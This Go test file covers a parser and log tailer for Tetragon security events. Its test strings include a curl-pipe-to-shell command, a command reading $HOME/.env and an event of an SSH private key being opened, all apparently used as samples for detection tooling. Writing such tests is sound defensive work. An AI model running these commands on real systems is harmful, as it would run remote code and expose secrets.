package tetragon

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

func TestParseExecFromTheSpike(t *testing.T) {
	line := []byte(`{"process_exec":{"process":{"exec_id":"ODYzMDFjYzFkZjM1OjMzNDY4ODcxNzM0MDk6NjE2MjE=","pid":61621,"uid":1000,"cwd":"/home/sek","binary":"/usr/bin/curl","arguments":"-s -o /dev/null https://example.com","flags":"execve","start_time":"2026-10-07T20:57:56.369178686Z","parent_exec_id":"ODYzMDFjYzFkZjM1OjA6NjE1OTc=","environment_variables":[{"Key":"OTEL_SERVICE_NAME","Value":"spike-agent"}]}},"node_name":"86301cc1df35","time":"2026-10-07T20:57:56.369176411Z"}`)
	ev, err := Parse(line)
	if err != nil {
		t.Fatal(err)
	}
	p := ev.Process()
	if ev.Exec == nil || p.PID != 61621 || p.Binary != "/usr/bin/curl" || !p.Known() {
		t.Fatalf("bad exec: %+v", ev)
	}
	if p.EnvValue("OTEL_SERVICE_NAME") != "spike-agent" {
		t.Fatal("env not parsed")
	}
	// the parent was unresolved (ktime 0) but its pid is still in the id
	if pid, ok := ExecIDPID(p.ParentExecID); !ok || pid != 61597 {
		t.Fatalf("parent pid = %d, %v", pid, ok)
	}
}

func TestParseUnenrichedKprobe(t *testing.T) {
	line := []byte(`{"process_kprobe":{"process":{"pid":61597,"flags":"unknown","start_time":"2026-10-07T20:57:54.157560876Z"},"function_name":"security_file_open","args":[{"file_arg":{"path":"/tmp/h/.ssh/id_rsa","permission":"-rw-r--r--"}}],"policy_name":"selenne-files"},"node_name":"n","time":"2026-10-07T20:57:54.157560276Z"}`)
	ev, err := Parse(line)
	if err != nil {
		t.Fatal(err)
	}
	if ev.Kprobe == nil || ev.Process().Known() || ev.Kprobe.Args[0].FileArg.Path != "/tmp/h/.ssh/id_rsa" {
		t.Fatalf("bad kprobe: %+v", ev.Kprobe)
	}
}

func TestExecIDPID(t *testing.T) {
	id := base64.StdEncoding.EncodeToString([]byte("node:123:4242"))
	if pid, ok := ExecIDPID(id); !ok || pid != 4242 {
		t.Fatal(pid, ok)
	}
	for _, bad := range []string{"", "!!", base64.StdEncoding.EncodeToString([]byte("nopid"))} {
		if _, ok := ExecIDPID(bad); ok {
			t.Fatalf("%q decoded", bad)
		}
	}
}

func TestSplitArgs(t *testing.T) {
	cases := map[string][]string{
		`-s -o /dev/null https://example.com`:      {"-s", "-o", "/dev/null", "https://example.com"},
		`-c "cat "$HOME/.env" > /dev/null"`:        {"-c", "cat $HOME/.env > /dev/null"},
		`-c "true || curl -s https://x/i.sh | sh"`: {"-c", "true || curl -s https://x/i.sh | sh"},
		`a\ b 'c d' ""`: {"a b", "c d", ""},
		``:              nil,
	}
	for in, want := range cases {
		if got := SplitArgs(in); !reflect.DeepEqual(got, want) {
			t.Errorf("SplitArgs(%q) = %q, want %q", in, got, want)
		}
	}
}

func appendFile(t *testing.T, name, s string) {
	t.Helper()
	f, err := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.WriteString(s); err != nil {
		t.Fatal(err)
	}
	f.Close()
}

func drain(t *testing.T, tl *Tailer) []string {
	t.Helper()
	var out []string
	for {
		line, _, ok, err := tl.Next()
		if err != nil {
			t.Fatal(err)
		}
		if !ok {
			return out
		}
		out = append(out, string(line))
	}
}

func TestTailerWaitsForFileAndPartialLines(t *testing.T) {
	path := filepath.Join(t.TempDir(), "events.log")
	tl, err := OpenTailer(path, Position{})
	if err != nil {
		t.Fatal(err)
	}
	if got := drain(t, tl); got != nil {
		t.Fatal(got)
	}
	appendFile(t, path, "one\ntw")
	if got := drain(t, tl); !reflect.DeepEqual(got, []string{"one"}) {
		t.Fatal(got)
	}
	if tl.Position().Offset != 4 { // the half-written line is not consumed
		t.Fatal(tl.Position())
	}
	appendFile(t, path, "o\n")
	if got := drain(t, tl); !reflect.DeepEqual(got, []string{"two"}) {
		t.Fatal(got)
	}
}

func TestTailerFollowsRotationWithoutLosingLines(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.log")
	appendFile(t, path, "a\n")
	tl, _ := OpenTailer(path, Position{})
	drain(t, tl)
	appendFile(t, path, "b\n") // written, then rotated before we read it
	if err := os.Rename(path, filepath.Join(dir, "events-2026-10-07T21-00-00.000.log")); err != nil {
		t.Fatal(err)
	}
	appendFile(t, path, "c\n")
	if got := drain(t, tl); !reflect.DeepEqual(got, []string{"b", "c"}) {
		t.Fatal(got)
	}
}

func TestTailerResumesInARotatedFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.log")
	appendFile(t, path, "a\nb\n")
	tl, _ := OpenTailer(path, Position{})
	tl.Next()
	pos := tl.Position() // stopped after "a"
	tl.Close()
	// down while Tetragon rotated
	rotated := filepath.Join(dir, "events-2026-10-07T21-00-00.000.log")
	os.Rename(path, rotated)
	appendFile(t, path, "c\n")
	tl, err := OpenTailer(path, pos)
	if err != nil {
		t.Fatal(err)
	}
	if got := drain(t, tl); !reflect.DeepEqual(got, []string{"b", "c"}) {
		t.Fatal(got)
	}
	if got := Rotated(path); !reflect.DeepEqual(got, []string{rotated}) {
		t.Fatal(got)
	}
}

func TestTailerRestartsOnTruncation(t *testing.T) {
	path := filepath.Join(t.TempDir(), "events.log")
	appendFile(t, path, "aaaa\nbbbb\n")
	tl, _ := OpenTailer(path, Position{})
	drain(t, tl)
	os.WriteFile(path, []byte("c\n"), 0o644)
	if got := drain(t, tl); !reflect.DeepEqual(got, []string{"c"}) {
		t.Fatal(got)
	}
}

func TestForEachLineStopsAtOffset(t *testing.T) {
	path := filepath.Join(t.TempDir(), "events.log")
	appendFile(t, path, "a\nb\nc\n")
	var got []string
	ForEachLine(path, 4, func(l []byte) { got = append(got, string(l)) })
	if !reflect.DeepEqual(got, []string{"a", "b"}) {
		t.Fatal(got)
	}
}
